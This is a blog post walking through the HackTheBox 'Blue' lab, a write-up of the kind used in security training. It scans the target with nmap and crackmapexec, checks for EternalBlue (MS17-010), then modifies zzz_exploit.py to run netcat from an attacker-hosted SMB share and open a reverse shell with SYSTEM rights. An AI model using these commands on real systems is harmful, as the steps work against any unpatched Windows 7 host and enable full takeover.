---
layout: post
comments: true
title: "Blue HTB Write Up"
tags: ['hackthebox', 'writeup', 'eternal-blue']
---

## Introduction
Today we are going to PWN a HackTheBox machine called Blue.
Blue is an easy machine, we are going to use tools such as nmap to scan the ports, crackmapexec to recognise all the network devices via smb.
We are going to exploit an EternalBlue vulnerability, and finally we are going to learn how to inject code in the victim's machine through this vulnerability.

## Dependencies
* In order to everything work you must have Python2 and pip2 installed.
[HowToInstallPip2Parrot](../../../../2021/12/30/installing-pip2-on-parrot.html)

* crackmapexec
```bash
sudo apt install crackmapexec
```

## Ports recognizement
The ip address of this machine is the 10.10.10.40.
First we need to indetify all the ports open on the machine, we are going to run:
```bash
nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.40 -oG ports
```
* -sS -> TCP SYN (Stealth) Scan
* --min-rate -> specify the number of packets you are sending per second
* -p- -> scan all range of ports
* --open -> only scan open ports
* -vvv -> while the program in running you can get additional information about hte proccess
* -n -> don't use DNS resolution
* -Pn -> use it if the host is blocking ping proves
* -oG -> return the result in a grepeable file in order to proccess it later

We are going to use [getPorts](https://github.com/isuckatlinux/getPorts) to extract all the relevant data from the nmap output
```bash
getPorts ports
```

Once we extracted all the ports we are going to find out the service they are running:
```bash
nmap -sC -sV -p135,139,445,49153 10.10.10.40 -oN services
```
* -oN -> return the output into a nmap file
* -sV -> enum services
* -p*p1, p2, pn* -> specify this ports


We can see port 445 open, this might be a smb vulnerability, let's find out.
With [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) we can see all the devices using a service over the entire network (beside other uses)
```bash
crackmapexec smb 10.10.10.0/24
```
*Because we are targeting a particular computer we could also specify this computer and not the entire network*



We see the host is runnning windows7 🤓 <br>
MS017, most know as Eternal Blue, was a vulnerability in the smb protocol that affectes WindowsXP and windows7 computers.
If this haven't been patched on the machine this means that we already got a very serious vulneravilty in the system that will allow us to execute code as admin.

We are going to see two ways of see if this machine is vulnerable:
1. Nmap scripts.<br>
Nmap have a lot of scripts that allows checking multiple vulneravilities. These scripts are sorted by categories.
In order to see all the categories in nmap we could run:
```bash
locate .nse | xargs grep "categories" | grep -oP '"*"' | sort -u
```
We can see a bunch of categories, we will cover all the categories in another post soon 🤖.
For the time we are going to be using "vuln and safe"
So lets run:
```bash
nmap --script "vuln and safe" -p445 10.10.10.40 -oN smbVulnerable
```
![image1](https://abusinglinux.com/assets/images/blue_htb/nmap_scripts_output.png)
BINGO! We can see in the picture the service is vulnerable

2. Eternal blue checker <br>
We are going to use a [checker](https://github.com/worawit/MS17-010) 
```bash
git clone https://github.com/worawit/MS17-010
cd MS17-010
```
The checker is named *checker.py*<br>
We run:
```bash
python2 checker.py 10.10.10.40
```
We can see all the pipes are denied.
We have to try the user 'guest'. We look into the code and we see two fields empty, the username and the password.
We introduce 'guest' in the username string.
<br>
We run again:
```bash
python2 checker.py 10.10.10.40
```

![image2](https://abusinglinux.com/assets/images/blue_htb/username_guest.PNG)<br>
As we can see we have a bunch of pipes that reported OK. <br>


## Exploiting
In the exploiting phase we could use Metasploit, but there is an issue with that. Eternal blue is a kernel-level vulnerability, that means that if anything goes wrong (or everything doesn't go perfect) we most likely to have blue screen or very inestable shells.
That's why in these cases where you want to have all control is actually better to just inject the code yourself.

In order to proceed to inject code we are going to use the repo we used before to check the vulnerability [MS17-010](https://github.com/worawit/MS17-010).

Now we are going to use the zzz_exploit.py
This exploit run a trivial command on the victim's machine. We are going to find that command and replace it with our personal one.
The method we are going to edit is *smb_pwn*.<br>
We are going to comment all lines of the code except the first one. And we are going to decomment the *service_exec* line <br>
The code should look like this:<br>
![image3](https://abusinglinux.com/assets/images/blue_htb/zzz_modified.PNG)

We are going to exploit this vulnerability by sharing a folder with smb witch contains [netcat](https://es.wikipedia.org/wiki/Netcat) and we are going to run netcat from the victims machine to produce a reverse shell.
The command we have to inject is the next
```bash
cmd /c \\<your_tun0_ip>\sharedFolder\nc.exe -e cmd <your_tun0_ip> 443
```
So you the line have to look like that:
```python
service_exec(conn, r'cmd /c \\<your_tun0_ip>\sharedFolder\nc.exe -e cmd <your_tun0_ip> 443')
```
In addition, we have to set the username to 'guest' just how we did on the checker

So, the steps are:
1. Share a folder with the netcat
    * We have to locate netcat in our machine and copy it to our folder wich we are going to be sharing soon
    ```bash
    locate nc.exe
    cp *path_to_netcat* $(pwd)
    ```
    If you are not able to locate nc.exe here's a link to download [netcat](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip)<br>
    *At this point we have to have netcat in our folder*

    * Share the folder
    ```bash
    imppacket-smbserver sharedFolder $(pwd) -smb2support 
    ```
    *The flag smb2support is no necessary beacuse we are dealing with version one of the smb protocol, but It's a good practice to give support v2 just in case*


2. Listening at port 443 to get the reverse shell
```bash
    nc -nlvp 443
```
3. Finallly exploiting!
We could use any pipe the checker reported to be OK.<br>
We are going to use samr

```bash
zzz_exploit.py 10.10.10.40 samr
```

>BOOM 💥

If everything it's working fine we should see a shell.
We could run
```cmd
whoami
```
We should see nt authority system, that means that we have admin privileges.

Now let's see the flags:
```cmd
cd C:\Users\haris\Desktop
type user.txt

cd C:\Users\Administrator\Desktop
type root.txt
```

Thank's all for reading this! I hope you enjoyed this writing, any feedback is welcome.

{% if page.comments %}
<div id="disqus_thread"></div>
<script>
    /**
    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
    /*
    var disqus_config = function () {
    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    */
    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://isuckatlinux.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
{% endif %}